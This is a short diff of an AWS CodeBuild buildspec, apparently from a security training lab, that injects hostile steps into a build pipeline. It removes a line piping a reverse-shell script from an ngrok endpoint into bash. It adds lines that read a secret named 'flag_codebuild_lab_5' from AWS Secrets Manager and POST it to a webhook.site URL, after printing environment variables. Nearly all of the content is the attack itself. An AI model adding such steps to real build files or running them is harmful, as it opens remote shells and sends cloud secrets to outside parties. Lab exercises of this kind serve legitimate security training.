@@ -6,4 +6,5 @@ phases:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
       - echo "Done"
-      - curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11309 | bash
+      - SECRET_VALUE=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1)
+      - curl -X POST https://webhook.site/3638624a-31a8-4f13-b8e6-e9bd47a20e18 --data "flag=$SECRET_VALUE"
